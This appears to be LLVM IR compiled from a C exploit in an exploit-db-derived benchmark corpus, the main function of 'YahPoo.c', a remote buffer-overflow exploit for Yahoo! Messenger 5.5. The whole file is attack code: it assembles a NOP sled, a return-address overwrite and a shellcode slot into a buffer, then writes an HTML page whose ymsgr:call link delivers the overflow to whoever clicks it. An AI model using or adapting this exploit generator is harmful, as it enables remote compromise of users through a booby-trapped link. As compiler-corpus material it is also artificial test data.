; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21484.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21484.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@win32_msgbox = common dso_local global i8* null, align 8
@stdout = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [20 x i8] c"\0A\09YahPoo.c By bob.\0A\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"Remote Exploit for Yahoo! Messenger 5.5\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"\09DSR-[www.dtors.net]-DSR\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"Makin' da EbUL HTML File... \00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"yahoo.html\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@stderr = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [8 x i8] c"Failed\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"Opened!\0A\00", align 1
@ret = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [7 x i8] c"<html>\00", align 1
@.str.9 = private unnamed_addr constant [44 x i8] c"<title>Bought to you by dtors.net!</title>\0A\00", align 1
@.str.10 = private unnamed_addr constant [38 x i8] c"<B>Dtors Security Research (DSR)</B>\0A\00", align 1
@.str.11 = private unnamed_addr constant [40 x i8] c"<p>Yahoo Messenger 5.5 exploit....</p>\0A\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"<pre>\00", align 1
@.str.13 = private unnamed_addr constant [65 x i8] c"<a href=%cymsgr:call?%s%c>!EbUL Link!</a></body></pre></html>\00\00\00\00", align 1
@.str.14 = private unnamed_addr constant [60 x i8] c"\0ADa ebUL HTML file is >>yahoo.html<<\0AEnjoy!\0Awww.dtors.net\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [5000 x i8], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %9 = load i8*, i8** @win32_msgbox, align 8
  store i8* %9, i8** %6, align 8
  store i32 320, i32* %8, align 4
  %10 = load i32*, i32** @stdout, align 8
  %11 = call i32 (i32*, i8*, ...) @fprintf(i32* %10, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  %12 = load i32*, i32** @stdout, align 8
  %13 = call i32 (i32*, i8*, ...) @fprintf(i32* %12, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32*, i32** @stdout, align 8
  %15 = call i32 (i32*, i8*, ...) @fprintf(i32* %14, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %16 = load i32*, i32** @stdout, align 8
  %17 = call i32 (i32*, i8*, ...) @fprintf(i32* %16, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0))
  %18 = call i32* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  store i32* %18, i32** %5, align 8
  %19 = icmp eq i32* %18, null
  br i1 %19, label %20, label %24

20:                                               ; preds = %2
  %21 = load i32*, i32** @stderr, align 8
  %22 = call i32 (i32*, i8*, ...) @fprintf(i32* %21, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  %23 = call i32 @exit(i32 1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i32*, i32** @stderr, align 8
  %26 = call i32 (i32*, i8*, ...) @fprintf(i32* %25, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  br label %27

27:                                               ; preds = %24
  %28 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  %29 = load i32, i32* %8, align 4
  %30 = add nsw i32 %29, 32
  %31 = load i8*, i8** %6, align 8
  %32 = call i32 @strlen(i8* %31)
  %33 = add nsw i32 %30, %32
  %34 = call i32 @memset(i8* %28, i32 0, i32 %33)
  %35 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  %36 = load i32, i32* %8, align 4
  %37 = call i32 @memset(i8* %35, i32 144, i32 %36)
  %38 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8*, i8** @ret, align 8
  %43 = call i32 @memcpy(i8* %41, i8* %42, i32 4)
  %44 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = getelementptr inbounds i8, i8* %47, i64 4
  %49 = load i8*, i8** %6, align 8
  %50 = load i8*, i8** %6, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = call i32 @memcpy(i8* %48, i8* %49, i32 %51)
  %53 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 264
  store i8 -44, i8* %53, align 8
  %54 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 265
  store i8 -106, i8* %54, align 1
  %55 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 266
  store i8 122, i8* %55, align 2
  %56 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 267
  store i8 1, i8* %56, align 1
  %57 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 272
  store i8 -11, i8* %57, align 16
  %58 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 273
  store i8 1, i8* %58, align 1
  %59 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 274
  store i8 1, i8* %59, align 2
  %60 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 275
  store i8 120, i8* %60, align 1
  %61 = load i32*, i32** %5, align 8
  %62 = call i32 (i32*, i8*, ...) @fprintf(i32* %61, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %63 = load i32*, i32** %5, align 8
  %64 = call i32 (i32*, i8*, ...) @fprintf(i32* %63, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.9, i64 0, i64 0))
  %65 = load i32*, i32** %5, align 8
  %66 = call i32 (i32*, i8*, ...) @fprintf(i32* %65, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.10, i64 0, i64 0))
  %67 = load i32*, i32** %5, align 8
  %68 = call i32 (i32*, i8*, ...) @fprintf(i32* %67, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.11, i64 0, i64 0))
  %69 = load i32*, i32** %5, align 8
  %70 = call i32 (i32*, i8*, ...) @fprintf(i32* %69, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0))
  %71 = load i32*, i32** %5, align 8
  %72 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  %73 = call i32 (i32*, i8*, ...) @fprintf(i32* %71, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.13, i64 0, i64 0), i32 34, i8* %72, i32 34)
  %74 = load i32*, i32** %5, align 8
  %75 = call i32 @fclose(i32* %74)
  %76 = load i32*, i32** @stdout, align 8
  %77 = call i32 (i32*, i8*, ...) @fprintf(i32* %76, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.14, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32* @fopen(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
